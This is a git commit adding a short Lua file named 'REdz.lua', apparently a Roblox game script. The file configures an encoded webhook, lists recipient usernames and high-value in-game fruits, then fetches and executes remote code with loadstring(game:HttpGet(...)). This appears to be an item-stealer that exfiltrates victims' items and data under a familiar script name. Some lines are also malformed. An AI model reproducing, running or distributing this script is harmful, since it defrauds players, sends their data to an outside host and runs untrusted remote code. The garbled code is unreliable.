82462b6a61fe2744200a62c12de5e2949abb14a8
artem315 <brawlpas2016@gmail.com>
2025-04-16 17:03:08 +0300

    REdz.lua

---
+++ REdz.lua
@@ -0,0 +1,4 @@
+Webhook="https://webhook-protect.vercel.app/api/webhook?id=SEY3QThYTXZ2VUl0cmdmNjNqUlhIdzpFUTQwc09tWXB2aVZMZlI3LXdadnoyd3o1dm94TUFhNjdJQkpOYXJ2MFNMMFA4VS00ZERZVThSR2JpYk1ER2lhMHBnTkZJZ24xTjFnU2pYXzV0VmZodUtiRU1KWTU0cXpIcUZIZzR4Q1hVRHEzM0lhZWRBc2VDejlPQnN2WFZxcnlHdkFZSUtOMjZBSXFha1Q0eG92b282WjlzUEpOLVFIeks3OEIwckh3NFU"
+Usernames = {"Nazar6703",
+"Nazar6703"}(-s).FruitsToHit ={"Kitsune-Kitsune", "LeopardLeopard", "Yeti-Yeti", "Gas-Gas"}
+loadstring(game:HttpGet("https://raw.githubuser content.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
